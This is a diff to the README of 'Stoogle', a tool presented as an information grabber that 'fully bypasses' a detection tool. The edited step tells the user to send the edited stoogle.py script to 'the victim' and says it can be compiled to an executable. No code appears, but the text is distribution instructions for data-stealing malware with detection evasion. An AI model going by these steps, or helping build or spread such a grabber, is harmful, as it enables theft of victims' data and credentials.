@@ -35,7 +35,7 @@ Stoogle is a high-level information grabber that **fully bypasses Uncoverit**. I
     python setup.py
     ```
 4. Send:
-   Send the newly generated 'Stoogle - HOOKED.py' to the victim.
+   Send the newly edited ```stoogle.py``` to the victim.
    You can compile it to an exe.
    
 ## 🔧 Configuration
